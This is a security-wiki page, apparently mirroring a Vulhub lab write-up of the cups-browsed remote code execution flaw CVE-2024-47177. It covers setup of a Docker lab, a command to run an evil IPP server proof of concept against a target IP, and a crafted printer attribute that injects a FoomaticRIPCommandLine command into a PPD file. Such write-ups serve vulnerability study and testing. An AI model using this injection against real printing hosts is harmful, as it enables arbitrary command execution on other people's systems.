<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/cups-browsed/CVE-2024-47177/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="./" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="./" class="btn btn-xs btn-link">
        OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）
      </a>
    </div>
    
  </div>

    

    <h1 id="openprinting-cups-browsed-remote-code-execution-via-the-foomaticripcommandline-ppd-parameter-cve-2024-47177">OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177)<a class="headerlink" href="#openprinting-cups-browsed-remote-code-execution-via-the-foomaticripcommandline-ppd-parameter-cve-2024-47177" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>OpenPrinting CUPS (Common Unix Printing System) is an open-source printing system developed for Unix-like operating systems. It allows computers to act as print servers, managing local and network printers efficiently. Cups-Browsed is a daemon that is part of the CUPS system, specifically designed to browse for remote printers shared by other CUPS servers on the network. It facilitates automatic discovery and configuration of network printers, making it easier for users to access and use shared printing resources across a network without manual setup.</p>
<p>In the version 2.0.1 and before of Cups-Browsed, there is an issue from improper handling of the <code>FoomaticRIPCommandLine</code> parameter in PPD (PostScript Printer Description) files. An attacker can exploit this vulnerability by creating a malicious IPP (Internet Printing Protocol) server that sends crafted printer information to a vulnerable Cups-Browsed instance, then execute arbitrary command on the system that vulnerable Cups-Browsed is running.</p>
<p>Reference:</p>
<ul>
<li><a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/</a></li>
<li><a href="https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8">https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start a CUPS server 2.4.7 and vulnerable cups-browsed 2.0.1:</p>
<div class="highlight"><pre><span></span><code>docker-compose up -d
</code></pre></div>
<p>After the server is running, you can access the CUPS web interface via <code>http://&lt;your-ip&gt;:631</code>.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>First, download the <a href="https://github.com/vulhub/evil-ipp-server">evil-ipp-server</a> project and run the <a href="https://github.com/vulhub/evil-ipp-server/blob/master/poc.py">poc.py</a>:</p>
<div class="highlight"><pre><span></span><code>python poc.py [evil-ipp-server-ip] [target-ip]
</code></pre></div>
<p>This script will start a evil IPP server on the <code>[evil-ipp-server-ip]</code> and send a UDP packet to the vulnerable Cups-Browsed on the target machine which IP is <code>[target-ip]</code>.</p>
<p>Once the Cups-Browsed received the request, it will try to connect to the evil IPP server. The IPP server will send back some attributes including a crafted <code>printer-privacy-policy-uri</code> attribute. The payload structure likes following:</p>
<div class="highlight"><pre><span></span><code><span class="p">(</span>
    <span class="n">SectionEnum</span><span class="o">.</span><span class="n">printer</span><span class="p">,</span>
    <span class="sa">b</span><span class="s1">&#39;printer-privacy-policy-uri&#39;</span><span class="p">,</span>
    <span class="n">TagEnum</span><span class="o">.</span><span class="n">uri</span>
<span class="p">):</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;https://www.google.com/&quot;</span><span class="se">\n</span><span class="s1">*FoomaticRIPCommandLine: &quot;&#39;</span> <span class="o">+</span>
    <span class="sa">b</span><span class="s1">&#39;echo 1 &gt; /tmp/I_AM_VULNERABLE&#39;</span> <span class="o">+</span>
    <span class="sa">b</span><span class="s1">&#39;&quot;</span><span class="se">\n</span><span class="s1">*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;</span><span class="p">],</span>
</code></pre></div>
<p>After that, Cups-Browsed will create a temporary PPD file in <code>/tmp/</code> and our payload will be injected in the file. The screenshot below shows the related logs from Cups-Browsed:</p>
<p><img alt="" src="1.png" /></p>
<p>At this time, the command haven't been executed, because we need at least one print job to trigger the execution of the command.</p>
<p>Print jobs can come from regular users or attackers. If TCP port 631 is open, we can use a browser to access it and find the malicious IPP server we just added, then create a "test page printing" job:</p>
<p><img alt="" src="2.png" /></p>
<p>Then you can see, the <code>echo 1 &gt; /tmp/I_AM_VULNERABLE</code> command has been executed successfully.</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="./" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="./" class="btn btn-xs btn-link">
        OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>